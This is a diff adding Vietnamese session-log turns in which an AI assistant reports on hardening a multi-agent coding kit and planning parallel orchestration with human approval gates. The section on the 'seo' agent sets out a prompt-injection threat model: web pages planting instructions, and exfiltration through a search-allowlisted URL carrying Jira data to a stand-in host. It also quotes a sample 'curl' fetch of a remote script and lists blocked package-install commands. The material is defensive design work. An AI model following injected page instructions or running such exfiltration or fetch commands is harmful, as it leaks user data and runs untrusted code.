@@ -30811,3 +30811,294 @@ Thứ tự mình đề xuất: **T20b → C2 → D2 → D1 → D4**, tức chỉ
 - T20b mục 4 cần bạn chọn cách sửa trước khi làm (các cách ghi ở `tasks/c1/followups-pr79.md`).
 
 Mình chưa sửa `concerns.md` hay `tasks/todo.md`. Bạn chốt thứ tự nào thì mình ghi vào hai file đó. T20b vẫn chỉ làm khi bạn đồng ý.
+
+# Phiên 33 · Lượt 101 — 2026-11-20
+
+**Bạn:** "Ok làm T20b trước, rồi làm C2. D2, D1, D4: Chờ nhu cầu, chưa làm". Ở câu hỏi về mục 4, bạn chọn "seo chạy cuối".
+
+**Claude:**
+
+T20b đã xong trong kit PR [#326](https://github.com/TungPH7/ai-orchestrator-v1/pull/326): 1.731 test xanh, CI xanh. Mình **chưa merge**, vì có năm điểm cần bạn xác nhận (ở dưới). Điểm đầu tiên làm hơi khác cách bạn chọn ở mục 4.
+
+## Đã sửa
+
+Mục nào cũng có test viết đỏ trước. Chi tiết từng mục ở `tasks/c1/followups-pr79.md`, phần "Đã làm".
+
+1. **WebFetch của `seo`:** bản ghi chỉ lấy URL của từng kết quả search. Câu `seo` tự gõ và phần chữ của trang đều không được ghi.
+2. **Đường cài gói phía npm:** chặn thêm `npm create`/`init <x>`, `pnpm`/`yarn`/`bun create`, `npm install-test`, `pnpx`, và mọi lệnh chạy qua `corepack`. `catalog:` được đọc từ `pnpm-workspace.yaml`. Một `package.json` lạ không còn làm tên của nó thành "gói của dự án".
+3. **Maven:** đọc được mọi dạng `<dependency>`, cùng plugin, extension, parent và annotation processor. `${…}` được đọc từ POM. Repository mới bị chặn. Chạy thử trên `pom.xml` của `shop`: đọc ra 28 artifact, không sót cái nào.
+4. **`seo` chạy cuối stage spec:** `/ao-build` dừng ở item `ao-seo` ngoài Epic, chờ bạn gõ `/ao-build <KEY> seo-ok`. Có thêm bước kiểm tự động, báo khi chữ của `seo` có địa chỉ lạ hay có lệnh. Bước này chạy ở cổng ① và ở chỗ dừng `seo-ok`.
+5. **`seo` đọc được ledger riêng của nó.**
+6. **Mức:** nâng mức qua phiên chính giờ được tính, chỉ hạ mức mới bị bỏ qua. `/ao-status` báo khi một nhãn mức không được tính. Hạ mức thì làm trên giao diện Jira.
+7. **`pnpm add zod` không kèm version** bị chặn khi tên đã duyệt có `range`.
+8. **Báo cáo QA:** chỉ `qa` viết được comment dạng "QA report". Lần QA lại chỉ lấy mã `AC<n>` từ báo cáo.
+9. **Low 9 (của `shop`):** để vào lần chép kit của C2.
+10. **`jira:check`:** báo `restrict-split` khi một transition có hơn một rule Restrict. Checklist Jira dặn thêm group vào rule có sẵn, không thêm rule mới.
+
+## Cần bạn xác nhận
+
+1. **Mục 4 làm khác một chút so với lúc hỏi.**
+   - Lúc hỏi, cách này là: `ao-step` tự mở PR tài liệu thay cho `ba`.
+   - Mình làm thế này: `ba` vẫn mở PR tài liệu (sau `sa`), rồi `seo` viết, và `ao-step` push commit của `seo` lên PR đó.
+   - Kết quả với bạn vẫn như vậy: không thêm lần dừng nào, và không agent nào có Bash đọc chữ của `seo` trước khi bạn đọc ở cổng ①.
+   - Lý do: mô tả PR phải theo template, và `ba` đang viết nó. Nếu để `ao-step` mở PR thì phải viết thêm code tự soạn mô tả.
+   - Đổi lại, mô tả PR không tóm tắt mục SEO. Nó chỉ ghi rằng `seo` viết sau.
+2. **Thêm đường dẫn được bảo vệ:**
+   - `pnpm-workspace.yaml`: chứa `allowBuilds`, tức gói nào được chạy script lúc cài, cùng catalog và overrides;
+   - `.pnpmfile.*`;
+   - cả thư mục `.mvn/`, kể cả file ghi URL tải Maven.
+
+   Agent sẽ dừng khi cần đổi các file này, và bạn đổi.
+3. **Chặn `mvn -s` / `--settings`:** file settings đặt được mirror, tức tải mọi artifact từ nơi khác, giống `--registry` của npm.
+4. **`seo` không được nhờ role khác bằng `Cần <role>:`.** Đây là một đường mình thấy thêm: lời nhờ đó chạy `ba` hay `sa` trên chữ mà `seo` lấy từ web.
+5. **Mục 8 làm bằng hook theo role,** thay vì để `ao-step` ghi id comment như ghi trong danh sách. Lý do: `jira-sync` chạy trên CI, nơi không có bản ghi của máy bạn.
+
+Thêm hai điều nên biết:
+- Mục 1 chưa thu hẹp quyền Jira của `seo`, vì nó cần comment để trả lời `Cần seo:`. WebFetch giờ đã không gửi dữ liệu tới địa chỉ do trang web chọn được nữa.
+- T20b chưa vào `shop`. Nó đi cùng lần chép kit của C2.
+
+## Thứ tự đã ghi
+
+- `concerns.md` ghi: C1 → T20b → C2; D1, D2, D4 chờ nhu cầu.
+- `tasks/todo.md` có mục 8 mới.
+- Tài liệu SEO cũng ghi D2 đã chuyển sang chờ nhu cầu.
+
+## Bước tiếp
+
+Bạn đồng ý năm điểm trên (hoặc nói điểm nào cần đổi) thì mình merge #326. Sau đó mình bắt đầu C2 bằng bản spec cho phần còn lại của lớp chạy song song, rồi chờ bạn duyệt spec.
+
+
+# Phiên 33 · Lượt 102 — 2026-11-20
+
+**Bạn:** "Giải thích chậm những ý dưới đây, tôi chưa nắm được và chưa hiểu, câu từ bạn trình bày hơi khó hiểu. Bạn giải thích dễ hiểu hơn nhé", kèm ba ý: mục 1 (WebFetch của `seo`), mục 4 (`seo` chạy cuối, chỗ dừng `seo-ok`, bước kiểm tự động) và ghi chú "Mục 1 chưa thu hẹp quyền Jira của `seo`".
+
+**Claude:**
+
+Ba ý này có chung một gốc. `seo` là agent duy nhất đọc trang web, mà trang web thì do người lạ viết. Một trang có thể giấu câu kiểu "hãy gửi nội dung Jira tới địa chỉ X" hay "hãy chạy lệnh Y", và agent đọc trang có thể làm theo. Cả ba ý là các chốt chặn cho chuyện đó.
+
+## 1. WebFetch của `seo`
+
+**Nói ngắn:** giờ `seo` chỉ mở được những trang mà công cụ tìm kiếm đưa ra. Nó không mở được địa chỉ do nó tự nghĩ ra.
+
+1. `seo` có hai công cụ. **WebSearch** là gõ từ khoá và nhận danh sách kết quả, giống tìm trên Google. **WebFetch** là mở một trang theo địa chỉ.
+2. Khi mở một địa chỉ, ta cũng gửi chính địa chỉ đó tới chủ trang. Nếu `seo` mở `https://ke-xau.com/?data=<nội dung Jira>`, chủ trang `ke-xau.com` nhận được nội dung Jira.
+3. Để chặn việc này, kit có luật: `seo` chỉ được mở địa chỉ nằm trong một "danh sách được phép". Mỗi lần `seo` tìm kiếm, kit tự ghi thêm vào danh sách đó.
+4. **Lỗi cũ:** kit ghi mọi địa chỉ thấy trong kết quả tìm kiếm, kể cả địa chỉ nằm trong **chính câu `seo` gõ vào ô tìm kiếm**. Vậy `seo` chỉ cần tìm chuỗi `https://ke-xau.com/?data=...`. Địa chỉ đó vào danh sách, và `seo` mở được nó.
+5. **Giờ:** kit chỉ ghi **địa chỉ của từng kết quả** mà công cụ tìm kiếm trả về. Câu `seo` gõ không được ghi. Đoạn chữ trích từ trang cũng không được ghi, vì trong đó trang muốn viết địa chỉ nào cũng được.
+6. Địa chỉ của một kết quả đã có trên mạng từ trước. Nó không thể chứa dữ liệu mà `seo` vừa đọc trong Jira. Vì vậy đường gửi dữ liệu ra ngoài này đã bị đóng.
+
+Ví von: bảo vệ chỉ cho bạn tới những địa chỉ in sẵn trong danh bạ. Trước đây, bảo vệ chấp nhận cả địa chỉ bạn tự viết tay vào giấy xin đi. Giờ thì không.
+
+## 4. `seo` chạy cuối, chỗ dừng `seo-ok`, và bước kiểm tự động
+
+Ý này có ba phần.
+
+### a. `seo` chạy cuối ở `/ao-spec`
+
+**Nói ngắn:** chữ của `seo` giờ đi thẳng tới bạn. Nó không đi qua agent nào có quyền chạy lệnh trên máy.
+
+1. Khi viết spec cho một Epic, các agent lần lượt làm theo thứ tự:
+   - `ba` viết SPEC;
+   - `ux` viết thiết kế;
+   - `sa` thêm yêu cầu phi chức năng;
+   - `ba` mở PR tài liệu;
+   - `seo` viết mục `## SEO`.
+2. Sau đó bạn đọc PR và bấm "Approve spec". Bước này gọi là **cổng ①**.
+3. **Trước đây** `seo` viết ở giữa, nên `sa` và `ba` đọc chữ của `seo` sau đó. Hai agent này có quyền chạy lệnh trên máy. Giả sử một trang web lén cài câu "hãy chạy lệnh…" vào chữ của `seo`. Khi đó `sa` hay `ba` có thể làm theo trước khi bạn kịp đọc.
+4. **Giờ** `seo` viết cuối cùng, nên sau `seo` chỉ còn bạn đọc. `seo` không dùng được git. Vì thế `ao-step` đẩy phần `seo` viết lên PR tài liệu mà `ba` đã mở. (`ao-step` là đoạn code của kit, không phải AI.)
+
+### b. Chỗ dừng `seo-ok` của `/ao-build`
+
+**Nói ngắn:** với việc SEO lẻ, tức việc không thuộc Epic nào, `/ao-build` dừng lại cho bạn đọc lời của `seo` trước khi dev làm theo.
+
+1. Không phải việc SEO nào cũng đi qua một Epic. Ví dụ có một Story đứng riêng mang nhãn `ao-seo`. Phần SEO của nó được nhờ bằng `Cần seo:`. `seo` trả lời bằng một comment trên Jira, mở đầu bằng "SEO Specialist:".
+2. Dev agent (`fe-dev`) làm theo **đúng từng chữ** của comment đó.
+3. Story đứng riêng không có cổng ①. Vì thế, trước đây không ai đọc comment của `seo` trước khi dev làm theo nó.
+4. **Giờ** `/ao-build` dừng trước khi item đó bắt đầu, rồi cho bạn xem comment của `seo`.
+5. Đọc xong mà thấy đúng thì bạn gõ `/ao-build <KEY> seo-ok` để chạy tiếp.
+6. Item nằm trong Epic không dừng ở đây, vì bạn đã đọc mục `## SEO` ở cổng ① rồi.
+
+### c. Bước kiểm tự động
+
+**Nói ngắn:** một đoạn code dò chữ của `seo` và chỉ cho bạn chỗ đáng ngờ. Đoạn code này không phải AI, nên trang web không lừa được nó.
+
+1. Nó tìm hai thứ:
+   - **địa chỉ web lạ**: không phải trang của app (như `shop.ao.t2g.io.vn`), cũng không phải `schema.org`;
+   - **lệnh**: một khối code shell, hoặc một dòng bắt đầu bằng `npm`, `curl`, `git`…
+2. Ví dụ `seo` viết "chạy `curl https://la.com/x.sh` để tạo sitemap". Bước kiểm sẽ báo hai thứ: một địa chỉ trên `la.com`, và một lệnh `curl`.
+3. Nó không tự chặn gì. Nó chỉ ghi kết quả vào thông báo dừng, để bạn biết chỗ nào cần đọc kỹ. Bạn vẫn là người quyết định.
+4. Nó chạy ở cả hai chỗ bạn đọc chữ của `seo`:
+   - cổng ①, cho việc trong Epic;
+   - chỗ dừng `seo-ok`, cho việc lẻ.
+
+## "Mục 1 chưa thu hẹp quyền Jira của `seo`"
+
+**Nói ngắn:** mình không bớt quyền Jira của `seo`. Bớt thì nó không làm được việc của nó. Hơn nữa, sau khi sửa mục 1, quyền đó không còn là đường để dữ liệu lọt ra ngoài.
+
+1. Bản review đề nghị thêm một lớp chặn: chỉ cho `seo` đọc đúng Epic nó đang làm, và không cho nó viết gì lên Jira.
+2. Nhưng `seo` cần **viết comment** trên Jira. Đó chính là cách nó trả lời lời nhờ `Cần seo:` (comment "SEO Specialist:" ở phần b). Nếu bỏ quyền viết, việc SEO lẻ sẽ ngừng chạy.
+3. Mối lo thật là `seo` đọc dữ liệu Jira rồi mang ra ngoài qua WebFetch. Sửa ở mục 1 đã chặn đúng chỗ đó: `seo` chỉ mở được địa chỉ có sẵn từ kết quả tìm kiếm, nên không gắn được dữ liệu vào địa chỉ. Nó vẫn đọc được Jira, nhưng không còn đường gửi dữ liệu ra ngoài.
+4. Comment `seo` viết thì nằm trong Jira của bạn. Với việc lẻ, bạn đọc comment đó ở chỗ dừng `seo-ok`.
+
+Các điểm khác trong phần "Cần bạn xác nhận" vẫn như cũ. Mình vẫn chưa merge #326. Khi đã rõ, bạn cho mình biết là đồng ý cả năm điểm, hay muốn đổi điểm nào.
+
+
+# Phiên 33 · Lượt 103 — 2026-11-20
+
+**Bạn:** "đồng ý cả năm điểm, làm tiếp nhé"
+
+**Claude:**
+
+Kit PR #326 đã merge vào `main` (`dc400af`). Spec C2 đã viết xong ở `SPEC-c2.md` và đang chờ bạn duyệt. Mình chưa viết dòng code nào của C2.
+
+## C2 làm gì
+
+**Nói ngắn:** kit tự chạy cả một Epic, nhiều việc cùng lúc, và chỉ dừng ở chỗ cần bạn.
+
+1. **Bộ điều phối `/ao-run <EPIC>`.**
+   - Đây là một chương trình viết bằng code thường, không dùng AI.
+   - Nó đọc Jira và GitHub, rồi tự mở các lệnh `/ao-build`, `/ao-review`, `/ao-qa`… theo đúng thứ tự.
+   - Nó chạy nhiều lệnh cùng lúc, tối đa `lanes_max` lệnh (`shop` đang để 3).
+   - Gặp chỗ cần bạn (duyệt cổng, Accept, xem trước…) thì nó liệt kê ra. Bạn bấm xong, nó tự chạy tiếp.
+   - Hiện nay mình phải gõ từng lệnh.
+2. **Mỗi chỗ dừng ghi rõ "chờ ai":** chờ bạn, chờ CI, chờ deploy, hay chờ item khác. Bộ điều phối cần biết điều này để không chạy qua chỗ cần bạn.
+3. **Một dev agent làm được nhiều item cùng lúc,** nếu dự án cho phép (`runs.slots`). Mặc định vẫn là 1 item, như hiện nay.
+4. **`reviewer` và `security` chạy cùng lúc** khi còn chỗ, thay vì lần lượt. Mỗi vòng review bớt khoảng 7–10 phút.
+5. **`/ao-preview` chạy được khi bật làn.** Hiện nó dừng ngay khi bật làn, nên cả Epic `SHOP-7` không có lượt xem trước nào.
+6. **`merge-gate` chờ QA chạy xong rồi mới merge.** Bạn approve PR lúc nào cũng được. Lượt QA đang chạy sẽ không bị bản deploy mới cắt ngang.
+
+Hàng C2 còn ghi hai followup lặp lại khác: worktree QA thiếu `.env`, và dọn tiến trình khi QA bị dừng. Hai việc này đã xong từ kit PR #306 và #309.
+
+Không gõ `/ao-run` thì kit chạy y như bây giờ.
+
+## Cần bạn duyệt
+
+1. **Sáu phần trên thành sáu kit PR,** làm theo thứ tự đã ghi. Sau đó chép kit vào `shop` một lần, mang theo cả T20b.
+2. **`/ao-run` chỉ nhận một Epic, hoặc các item bạn nêu tên.** Không có chế độ "chạy hết dự án". Như vậy bạn vẫn là người chọn việc nào làm trước.
+3. **Việc nào tự chạy, việc nào chờ bạn:**
+   - Bộ điều phối **tự chạy**: viết spec, viết plan, trả lời lời nhờ, build, review, QA, và sửa khi review thấy Critical hay High.
+   - Việc **chờ bạn**: mọi cổng duyệt, Accept, xem trước, `seo-ok`, chấp nhận một High, release và lên Production.
+   - Finding Medium hay Low không làm nó tự sửa. Chúng chờ bạn ở cổng ③, như hiện nay.
+4. **Ngân sách và lúc dừng:**
+   - Mỗi lần `/ao-run` có ngân sách mặc định 30 USD.
+   - Tới mức đó, hoặc khi chạm giới hạn usage, nó thôi mở lệnh mới.
+   - Nếu chỉ còn việc chờ bạn, nó chờ tối đa 8 giờ rồi tự tắt.
+5. **Chỗ đặt các điểm dừng.** Ghi chú ở Lượt 100 nói điểm dừng phải nằm trong contract. Mình đề xuất cách khác:
+   - năm cổng duyệt vẫn ở contract;
+   - các chỗ dừng còn lại (như `seo-ok`) mang nhãn "chờ ai" ngay trong đoạn code quyết định bước kế tiếp;
+   - bộ điều phối hỏi chính đoạn code đó, nên mỗi luật chỉ nằm ở một chỗ, và không có hai bản để lệch nhau.
+6. **Số item mỗi dev agent làm cùng lúc** đặt trong `project.yaml` (`runs.slots`), mặc định là 1. Contract chỉ thêm một câu ghi chú.
+7. **`/ao-preview` trong làn** dùng cổng mặc định và database trên máy, như khi bạn tự chạy app. Trong lúc bạn xem, không agent nào sửa code của item đó.
+8. **Tín hiệu QA cho `merge-gate`** là một trạng thái "qa đang chạy" gắn lên commit trên GitHub. Nếu QA chết giữa chừng và trạng thái này treo quá 90 phút, `merge-gate` bỏ qua nó, để merge không bị chặn mãi.
+9. **Chạy thật trên Epic kế tiếp của `shop`.** Bạn chọn tính năng. Epic đó đo luôn tiêu chí 7 còn chờ của C1 (USD trên mỗi AC).
+
+Chi phí ước tính:
+- khoảng 4–5 ngày làm của phiên chính, 0 USD agent;
+- 15–30 USD cho lần chép kit vào `shop`, có review;
+- lần chạy thật chỉ tốn chi phí của các item trong Epic.
+
+## Bước tiếp
+
+Bạn duyệt chín điểm trên, hoặc nói điểm nào cần đổi. Điểm 9 (Epic nào) trả lời sau cũng được, miễn là trước lúc chạy thật. Duyệt xong, mình viết plan và todo của C2 để bạn duyệt tiếp. Code chỉ bắt đầu khi bạn nói "làm".
+
+
+# Phiên 33 · Lượt 104 — 2026-11-20
+
+**Bạn:** "Đồng ý tất cả trừ 2 điểm 6 và 8 cần thảo luận thêm", kèm hai thắc mắc:
+- điểm 6: trong một làn chỉ có tối đa một dev fe, nên hai item thì dev fe phải làm lần lượt; có hai dev fe (hai agent) làm hai item thì mới nghe đúng;
+- điểm 8: hiện không có QA nào chạy tới 90 phút; chờ 90 phút là lâu; khi QA đang làm thì không nên đếm giờ, chỉ đếm khi QA treo, và khi đã treo thì tắt ngay hoặc chờ ngắn thôi (ví dụ 10 phút).
+
+**Claude:**
+
+Bạn đúng ở cả hai điểm. Điểm 6 là mình viết sai ý. Điểm 8 thì 90 phút quá dài, và cách bạn nói (chỉ đếm giờ khi QA treo) làm được. Bên dưới là giải thích và cách sửa. Mình chưa sửa spec: bạn đồng ý thì mình sửa.
+
+Đã ghi là bạn duyệt các điểm 1–5, 7 và 9.
+
+## Điểm 6: số agent cùng role chạy cùng lúc
+
+**Nói ngắn:** ý đúng là như bạn nói, tức hai agent `fe-dev`, mỗi agent một item, ở hai làn khác nhau. Một agent không làm hai item cùng lúc.
+
+1. **Bạn hiểu đúng về làn.** Một làn là một item, và mỗi lúc trong làn chỉ có một agent. Story có hai Sub-task (BE và FE) vẫn ở một làn: `be-dev` làm trước, `fe-dev` làm sau. Điều này không đổi.
+2. **Agent không phải một "nhân viên" cố định.** Mỗi lượt build mở một tiến trình agent mới theo role, làm xong thì tắt. Vì vậy "hai dev fe" chỉ đơn giản là hai tiến trình `fe-dev` chạy cùng lúc, mỗi tiến trình trong làn của item mình.
+3. **Vì sao hôm nay chưa được:** contract có luật "mỗi dev agent tối đa 1 item In Progress". Trên Jira, mọi agent `fe-dev` cùng mang một giá trị Agent là `fe-dev`, nên luật này đếm chung. Ví dụ `lanes_max: 3` và có hai Story chỉ có phần FE: Story thứ hai vẫn phải chờ, dù còn làn trống.
+4. **Điểm 6 thay đổi đúng chỗ đó:** cho phép tối đa N agent cùng role chạy cùng lúc. Ví dụ với `lanes_max: 3` và 2 agent `fe-dev`:
+   - làn 1: `fe-dev` làm SHOP-81;
+   - làn 2: `fe-dev` làm SHOP-82;
+   - làn 3: `be-dev` làm SHOP-83.
+
+   Tổng số agent vẫn không vượt `lanes_max`.
+5. **Sửa chữ trong spec:** đổi tên điểm thành "Số agent cùng role chạy cùng lúc", và đổi tên khóa cho dễ hiểu, ví dụ `runs.agents_per_role: { fe-dev: 2 }`. Mặc định vẫn là 1, vì hai agent cùng role dễ sửa chung một file, và PR sau sẽ bị xung đột.
+
+Riêng điểm `reviewer` chạy cùng lúc với `security` (đã duyệt) là hai agent khác role trên cùng một PR. Hai agent này không làm trong làn: mỗi agent đọc một bản sao tạm riêng của PR, và không sửa code.
+
+## Điểm 8: chờ QA bao lâu
+
+**Nói ngắn:** đổi sang cách "nhịp tim". Khi QA còn làm, không đếm giờ. Chỉ khi QA thôi làm (chết hay treo) mới đếm, và chờ tối đa 10 phút.
+
+Số liệu thật của `shop`: 78 lượt QA, trung vị 7 phút, lâu nhất 32 phút (SHOP-76, QA tài liệu). Vậy 90 phút đúng là quá dài.
+
+Cách sửa:
+
+1. **QA bắt đầu:** `ao-step` gắn dấu "qa đang chạy" lên GitHub.
+2. **QA đang làm:** cứ 2 phút, `ao-step` gia hạn dấu một lần (nhịp tim). Không đếm giờ chạy: QA chạy 7 phút hay 40 phút cũng được.
+3. **QA xong** (PASS, FAIL hay bị dừng): `ao-step` gỡ dấu ngay. `merge-gate` đang chờ thấy dấu mất, và merge trong khoảng 1 phút.
+4. **Treo kiểu 1, `ao-step` chết** (máy tắt hay ngủ, mất mạng, tiến trình bị giết): không còn ai gia hạn dấu. Quá 10 phút kể từ lần gia hạn cuối, `merge-gate` coi như không còn QA và merge.
+5. **Treo kiểu 2, `ao-step` còn sống nhưng agent QA đứng im:** log của agent không có dòng mới trong 15 phút thì `ao-step` coi là treo và gỡ dấu ngay. `merge-gate` merge trong khoảng 1 phút.
+
+Vì sao không tắt ngay ở kiểu 1, và vì sao 15 phút ở kiểu 2:
+- `merge-gate` chạy trên GitHub, không nhìn thấy máy bạn. Nó chỉ biết `ao-step` đã thôi gia hạn. Chờ 10 phút, tức lỡ 5 nhịp, để một lần mất mạng ngắn không bị coi là chết.
+- Một lệnh chạy cả bộ E2E có thể im lặng vài phút mà không phải treo. 15 phút là mức an toàn so với lượt QA dài nhất đã đo (32 phút cho cả lượt).
+- Nếu đoán nhầm là treo, việc merge xảy ra, bản deploy mới cắt ngang lượt QA, và QA chạy lại. Đó đúng là chuyện vẫn xảy ra hôm nay, nên không tệ hơn.
+
+Thêm một thay đổi nhỏ: `merge-gate` chờ ngay trong lượt chạy của nó trên GitHub, kiểm lại mỗi phút. Như vậy cả khi `ao-step` chết, không cần ai gọi lại `merge-gate`.
+
+## Bước tiếp
+
+Bạn đồng ý hai cách sửa trên (hoặc nói chỗ nào cần đổi, ví dụ các mốc 2, 10, 15 phút) thì mình sửa `SPEC-c2.md`. Sau đó mình viết plan và todo của C2 để bạn duyệt. Code chỉ bắt đầu khi bạn nói "làm".
+
+
+# Phiên 33 · Lượt 105 — 2026-11-20
+
+**Bạn:** "đồng ý hai cách sửa trên, tiếp tục nhé"
+
+**Claude:**
+
+Mình đã sửa `SPEC-c2.md` theo hai cách bạn đồng ý và ghi spec là đã duyệt. Mình cũng đã viết plan (`tasks/c2/plan.md`) và todo (`tasks/c2/todo.md`). Plan đang chờ bạn duyệt. Mình chưa viết code.
+
+## Đã sửa trong spec
+
+- **Điểm 6:**
+  - đổi tên thành "Số agent cùng role chạy cùng lúc", khóa `runs.agents_per_role`;
+  - spec ghi rõ: một làn là một item, mỗi lúc trong làn chỉ một agent, và một agent không bao giờ làm hai item cùng lúc.
+- **Điểm 8:**
+  - `ao-step` gia hạn dấu "qa đang chạy" mỗi 2 phút (nhịp tim);
+  - `merge-gate` chờ ngay trong lượt chạy của nó, và bỏ qua dấu nào không được gia hạn trong 10 phút;
+  - log của agent QA im 15 phút thì `ao-step` gỡ dấu;
+  - thêm một chi tiết: `merge-gate` chỉ tin dấu do login của bạn đặt, nên agent không giả được dấu này.
+- **Thêm nhãn "chờ ai" thứ bảy là `next`:** chỗ dừng chuyển thẳng sang lệnh khác.
+  - Ví dụ: review thấy Critical hay High thì lệnh kế tiếp là `/ao-fix`.
+  - Không có nhãn này, bộ điều phối phải đọc chữ của chỗ dừng mới biết cần chạy `/ao-fix`. Ở điểm 5, bạn đã chọn không để bộ điều phối đọc chữ.
+  - Đây chỉ là chi tiết thực hiện của điểm 3 bạn đã duyệt. Danh sách việc tự chạy và việc chờ bạn không đổi.
+
+## Plan
+
+**Nói ngắn:** 15 task. Sáu phần đầu là việc của mình, không tốn tiền. Hai task cuối cần bạn và có tốn tiền.
+
+1. **T1:** PR tài liệu, gồm spec, plan, todo và nhật ký từ Lượt 101 (chưa commit).
+2. **T2–T12:** sáu phần của spec. Mỗi phần một nhánh và một kit PR. Mình tự merge khi CI xanh, 0 USD agent.
+3. **Ba chỗ dừng để báo bạn:**
+   - sau phần 1: mọi chỗ dừng đã có nhãn "chờ ai";
+   - sau phần 2: mình gửi bạn kế hoạch mà `/ao-run` in ra trên `shop`. Bước này chỉ đọc Jira và GitHub, chưa chạy agent nào;
+   - sau phần 6: mình hỏi bạn trước khi bắt đầu tốn tiền.
+4. **T13 [bạn]:** chép kit vào `shop`, mang theo cả T20b. Review khoảng 15–30 USD, và bạn merge.
+5. **T14 [bạn]:** chạy thật trên Epic kế tiếp của `shop`. Bạn chọn tính năng trước bước này.
+6. **T15:** đóng module.
+
+Ba quyết định trong plan đáng biết:
+- **Không chỗ dừng nào bị sót nhãn.** Hàm tạo chỗ dừng sẽ báo lỗi nếu thiếu nhãn "chờ ai". Điều này đúng cả với chỗ dừng thêm sau này.
+- **Nhãn gắn sai không làm bộ điều phối chạy qua chỗ cần bạn.** Trước khi mở lệnh ghi trong `next`, bộ điều phối hỏi lại bước kế tiếp thêm một lần.
+- **Dấu QA chỉ đặt bằng login `gh` của bạn,** như các lệnh release. Trước T11, mình kiểm login đó có quyền đặt dấu. Bước kiểm chỉ đọc tên quyền, không in token.
+
+## Bước tiếp
+
+Bạn duyệt plan, hoặc nói chỗ cần đổi. Khi bạn nói "làm", mình bắt đầu từ T1.
